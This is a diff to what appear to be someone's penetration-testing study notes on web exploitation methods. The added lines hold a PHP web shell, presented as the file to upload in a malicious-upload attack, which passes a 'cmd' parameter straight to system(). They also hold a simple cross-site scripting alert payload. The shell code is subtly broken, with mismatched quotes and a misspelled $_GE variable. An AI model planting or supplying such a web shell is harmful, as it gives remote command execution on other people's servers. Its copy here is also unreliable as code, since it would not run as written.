@@ -59,8 +59,22 @@ robots.txt: Shows you directories you may not know about -> http(s)://url/robots
 
 Exploitation Methods: - Server-Side Injection: Really only gets you /etc/passwd and /etc/hosts files (could find next hop or box from these)
                       - Malicious File Upload: 
-                      - Command Injection: 
-                       
+                        -FIle to upload: <HTML><BODY>
+                                         <FORM METHOD="GET" NAME="myform" ACTION="">
+                                         <INPUT TYPE="text" NAME="cmd">
+                                         <INPUT TYPE="submit" VALUE="Send">
+                                         </FORM>
+                                         <pre>
+                                         <?php
+                                         if($_GET['cmd"]) {
+                                           system($_GE['cmd']);
+                                           }
+                                         ?>
+                                         </pre>
+                                         </BODY></HTML>
+                      - Command Injection:
+                      - Directory Traversal
+                      - Cross-Site Scripting: <script>alert('meow');</script>  #Dont worry about this one
 
 
            
